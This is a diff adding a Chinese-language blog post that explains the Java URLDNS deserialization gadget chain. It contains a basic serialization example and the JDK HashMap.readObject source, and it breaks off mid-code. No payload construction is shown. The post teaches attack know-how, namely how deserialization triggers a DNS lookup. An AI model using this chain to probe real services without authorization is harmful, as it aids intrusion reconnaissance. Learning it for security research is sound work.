@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>URLDNS链详解 - N1Rvana&#39;s Blog</title><meta name="author" content="N1Rvana">
+<meta name="author-link" content="https://nlrvana.github.io">
+<meta name="description" content="&lt; !&ndash;more&ndash;&gt;
+先来看一下如何序列化/反序列化
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 package org.example; import java.io.*; public class App { public static void main( String[] args ) throws Exception { user user = new user(); user." /><meta name="keywords" content='URLDNS' /><meta itemprop="name" content="URLDNS链详解">
+<meta itemprop="description" content="&lt; !&ndash;more&ndash;&gt;
+先来看一下如何序列化/反序列化
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 package org.example; import java.io.*; public class App { public static void main( String[] args ) throws Exception { user user = new user(); user."><meta itemprop="datePublished" content="2024-01-14T00:12:12+08:00" />
+<meta itemprop="dateModified" content="2024-01-14T00:12:12+08:00" />
+<meta itemprop="wordCount" content="554">
+<meta itemprop="keywords" content="URLDNS," /><meta property="og:title" content="URLDNS链详解" />
+<meta property="og:description" content="&lt; !&ndash;more&ndash;&gt;
+先来看一下如何序列化/反序列化
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 package org.example; import java.io.*; public class App { public static void main( String[] args ) throws Exception { user user = new user(); user." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nlrvana.github.io/posts/fdfad53/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-01-14T00:12:12+08:00" />
+<meta property="article:modified_time" content="2024-01-14T00:12:12+08:00" />
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="URLDNS链详解"/>
+<meta name="twitter:description" content="&lt; !&ndash;more&ndash;&gt;
+先来看一下如何序列化/反序列化
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 package org.example; import java.io.*; public class App { public static void main( String[] args ) throws Exception { user user = new user(); user."/>
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://nlrvana.github.io/posts/fdfad53/" /><link rel="next" href="https://nlrvana.github.io/posts/ca4c9c3/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "URLDNS链详解",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/nlrvana.github.io\/posts\/fdfad53\/"
+    },"genre": "posts","keywords": "URLDNS","wordcount":  554 ,
+    "url": "https:\/\/nlrvana.github.io\/posts\/fdfad53\/","datePublished": "2024-01-14T00:12:12+08:00","dateModified": "2024-01-14T00:12:12+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "N1Rvana"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/archives/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/archives/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>URLDNS链详解</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="https://nlrvana.github.io" title="Author"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+    N1Rvana</a></span><span class="post-included-in">&nbsp;included in <a href="/categories/java/" class="post-category" title="Category - Java"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Java</a></span></div><div class="post-meta-line"><span title="published on 2024-01-14 00:12:12"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-01-14">2024-01-14</time></span>&nbsp;<span title="554 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 600 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>3 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#原理">原理</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>&lt;
+!&ndash;more&ndash;&gt;</p>
+<p>先来看一下如何序列化/反序列化</p>
+<div class="highlight" id="id-1"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">App</span><span class="w">   
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">user</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">user</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">user</span><span class="p">.</span><span class="na">setName</span><span class="p">(</span><span class="s">&#34;xiaoming&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//序列化输出  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">user</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 序列化写入文件  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;test.bin&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">fout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">file</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">fout</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">user</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 序列化写入到变量中  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ByteArrayOutputStream</span><span class="w"> </span><span class="n">bout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayOutputStream</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">jout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">bout</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">jout</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">user</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bout</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="n">str</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 从变量中反序列化  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayInputStream</span><span class="p">(</span><span class="n">str</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">user</span><span class="w"> </span><span class="n">user_d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">user</span><span class="p">)</span><span class="w"> </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">user_d</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">class</span> <span class="nc">user</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">Serializable</span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">user</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setName</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getName</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="urldns链详解" class="heading-element">
+  <a href="#urldns%e9%93%be%e8%af%a6%e8%a7%a3" class="heading-mark"></a>URLDNS链详解</h1><h2 id="原理" class="heading-element">
+  <a href="#%e5%8e%9f%e7%90%86" class="heading-mark"></a>原理</h2><p><code>java.util.HashMap</code>重写了<code>readObject</code>方法，在反序列化时调用<code>hash</code>函数计算 key 的 hashCode，而<code>java.net.URL</code>的 hashCode 在计算时会调用<code>getHostAddress</code>来解析域名，从而发出 DNS 请求
+由HashMap 类<code>readObject</code>引起，</p>
+<div class="highlight" id="id-2"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">readObject</span><span class="p">(</span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">s</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">reinitialize</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ObjectInputStream</span><span class="p">.</span><span class="na">GetField</span><span class="w"> </span><span class="n">fields</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">readFields</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Read loadFactor (ignore threshold)  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">float</span><span class="w"> </span><span class="n">lf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fields</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&#34;loadFactor&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">.</span><span class="na">75f</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">lf</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">0</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">Float</span><span class="p">.</span><span class="na">isNaN</span><span class="p">(</span><span class="n">lf</span><span class="p">))</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvalidObjectException</span><span class="p">(</span><span class="s">&#34;Illegal load factor: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">lf</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">lf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Math</span><span class="p">.</span><span class="na">min</span><span class="p">(</span><span class="n">Math</span><span class="p">.</span><span class="na">max</span><span class="p">(</span><span class="n">0</span><span class="p">.</span><span class="na">25f</span><span class="p">,</span><span class="w"> </span><span class="n">lf</span><span class="p">),</span><span class="w"> </span><span class="n">4</span><span class="p">.</span><span class="na">0f</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">HashMap</span><span class="p">.</span><span class="na">UnsafeHolder</span><span class="p">.</span><span class="na">putLoadFactor</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="n">lf</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">s</span><span class="p">.</span><span class="na">readInt</span><span class="p">();</span><span class="w">                </span><span class="c1">// Read and ignore number of buckets  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">mappings</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">readInt</span><span class="p">();</span><span class="w"> </span><span class="c1">// Read number of mappings (size)  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">mappings</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvalidObjectException</span><span class="p">(</span><span class="s">&#34;Illegal mappings count: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">mappings</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">mappings</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// use defaults  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">mappings</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">float</span><span class="w"> </span><span class="n">fc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">float</span><span class="p">)</span><span class="n">mappings</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">lf</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">1</span><span class="p">.</span><span class="na">0f</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">cap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="n">fc</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">DEFAULT_INITIAL_CAPACITY</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                   </span><span class="n">DEFAULT_INITIAL_CAPACITY</span><span class="w"> </span><span class="p">:</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                   </span><span class="p">(</span><span class="n">fc</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">MAXIMUM_CAPACITY</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                   </span><span class="n">MAXIMUM_CAPACITY</span><span class="w"> </span><span class="p">:</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                   </span><span class="n">tableSizeFor</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">fc</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">float</span><span class="w"> </span><span class="n">ft</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">float</span><span class="p">)</span><span class="n">cap</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">lf</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">threshold</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="n">cap</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">MAXIMUM_CAPACITY</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">ft</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">MAXIMUM_CAPACITY</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                     </span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">ft</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">Integer</span><span class="p">.</span><span class="na">MAX_VALUE</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// Check Map.Entry[].class since it&#39;s the nearest public type to  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// what we&#39;re actually creating.        SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nd">@SuppressWarnings</span><span class="p">({</span><span class="s">&#34;rawtypes&#34;</span><span class="p">,</span><span class="s">&#34;unchecked&#34;</span><span class="p">})</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Node</span><span class="o">&lt;</span><span class="n">K</span><span class="p">,</span><span class="n">V</span><span class="o">&gt;[]</span><span class="w"> </span><span class="n">tab</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Node</span><span class="o">&lt;</span><span class="n">K</span><span class="p">,</span><span class="n">V</span><span class="o">&gt;[]</span><span class="p">)</span><span class="k">new</span><span class="w"> </span><span class="n">Node</span><span class="o">[</span><span class="n">cap</span><span class="o">]</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">table</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tab</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
